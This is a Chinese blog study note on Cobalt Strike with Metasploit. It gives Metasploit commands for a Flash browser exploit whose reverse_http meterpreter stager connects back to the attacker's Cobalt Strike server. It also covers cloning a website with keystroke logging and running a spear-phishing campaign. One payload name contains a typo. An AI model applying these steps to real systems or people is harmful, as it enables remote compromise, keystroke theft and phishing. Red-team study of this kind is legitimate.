---
title: 【CS学习笔记】9、Metasploit框架
date: 2020-04-19 15:05:24
id: 200419-150524
img: https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs9-4.png
summary: 如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。
tags:
- Cobalt Strike
- 学习笔记
- 红队
categories:
- CS 学习笔记
---

# 0x00 客户端的漏洞利用

如果想使用MSF对目标进行漏洞利用，再通过这个漏洞来传输Beacon的话，也是可以的。

1、首先在MSF上选择攻击模块

2、接着在MSF上设置Payload为`windows/meterpreter/reverse_http`或者`windows/meterpreter/reverse_https`，这么做是因为CS的Beacon与MSF的分阶段协议是相兼容的。

3、之后在MSF中设置Payload的LHOST、LPORT为CS中Beacon的监听器IP及端口。

4、然后设置 `DisablePayloadHandler` 为 True，此选项会让 MSF 避免在其内起一个 handler 来服务你的 payload 连接，也就是告诉MSF说我们已经建立了监听器，不必再新建监听器了。

5、再设置 `PrependMigrate` 为 True，此选项让 MSF 前置 shellcode 在另一个进程中运行 payload stager。如果被利用的应用程序崩溃或被用户关闭，这会帮助 Beacon 会话存活。

6、最后运行`exploit -j`，-j 是指作为job开始运行，即在后台运行。

# 0x01 操作

## CS

在CS中新建一个HTTP Beacon，创建过程不再赘述，具体操作过程可参见之前第5节的学习笔记。

## MSF

1、在MSF中选择攻击模块，根据教程这里选择的`adobe_flash_hacking_team_uaf`模块，不过个人感觉现在这个模块已经不太能被利用成功了。

```
use exploit/multi/browser/adobe_flash_hacking_team_uaf
```

2、接着配置payload，这里选择revese_http payload

```
set payload windows/meterpreter/revese_http
set LHOST cs_server_ip
set LPORT 80
```

3、之后，配置`DisablePayloadHandler`、`PrependMigrate`为 True

```
set DisablePayloadHandler True
set PrependMigrate True
```

4、最后，开始攻击。

```
exploit -j
```

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs9-1.png)

## 伪装——克隆网站

在向目标发送漏洞程序之前，我们将自己进行伪装一下，这样可以更好的保护自己，同时提高成功率。CS上有个克隆网站的功能，能够较好的帮助到我们。

首先，来到`Attacks --> Web Drive-by --> Clone Site`下，打开克隆网站的功能，之后写入待克隆网站的URL，在Attack中写入MSF中生成的URL。

其中`Log keystrokes on cloned site`选项如果勾选则可以获取目标的键盘记录，记录结果在Web Log中能够查看。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs9-2.png)

之后，浏览器打开克隆站点地址，如果目标存在漏洞，就可以被利用了，同时在CS中也会观察到主机上线。

# 鱼叉式网络钓鱼

用CS进行钓鱼需要四个步骤：

1、创建一个目标清单

2、制作一个邮件模板或者使用之前制作好的模板

3、选择一个用来发送邮件的邮件服务器

4、发送邮件

## 目标清单

目标清单就是每行一个邮件地址的txt文件，即每行包含一个目标。

在一行中除了邮件地址也可以使用标签或一个名字。如果提供了名称，则有助于 Cobalt Strike 自定义每个网络钓鱼。

这里使用一些在线邮件接收平台的邮箱地址作为示例。

```
astrqb79501@chacuo.net	test1
gswtdm26180@chacuo.net	test2
ypmgin95416@chacuo.net	test3
```

将以上内容保存为txt文本文件，就创建好了自己的目标清单。

## 模板

使用模板的好处在于可以重复利用，制作钓鱼模板也很简单。

首先可以自己写一封邮件发给自己，或者直接从自己收件箱挑选一个合适的。有了合适的邮件之后，查看邮件原始信息，一般在邮件的选项里能找到这个功能。最后将邮件的原始信息保存为文件，一个模板就制作完成了。

## 发送邮件

有了目标和模板，然后选好自己的邮件服务器，之后就可以发送消息了。

在CS客户端中，点击`Attacks --> Spear Phish`即可打开网络钓鱼模块。添加上目标、模板、钓鱼地址、邮箱服务、退回邮箱，其中Bounce To为退回邮件接收地址，注意要和配置邮件服务器时填的邮箱一致，否则会报错。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs9-3.png)

所有信息添加完成后，可以点击Preview查看。如果感觉效果不错，就可以点击send发送了。

当目标收到钓鱼邮件，并且点击钓鱼邮件中的链接后，如果钓鱼链接配置的没有问题，CS就能够上线了。

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/cs9-4.png)

由于此处是仅作为测试用途，所以模板中的链接都是自己的本地内网CS服务器地址，如果是真实环境中，则自然需要使用公网的地址才行。

在真实环境中的钓鱼邮件也不会像这里这么浮夸，真实环境中的钓鱼邮件往往都伪装成和正经儿的邮件一模一样，单从表面上看很难看出区别，因此提高自己的安全意识还是很重要滴。

> 参考链接：
>
> [https://www.bilibili.com/video/BV16b411i7n5](https://www.bilibili.com/video/BV16b411i7n5)
>
> [https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf](https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf)
>
> 更多信息欢迎关注我的微信公众号：TeamsSix

![](https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png)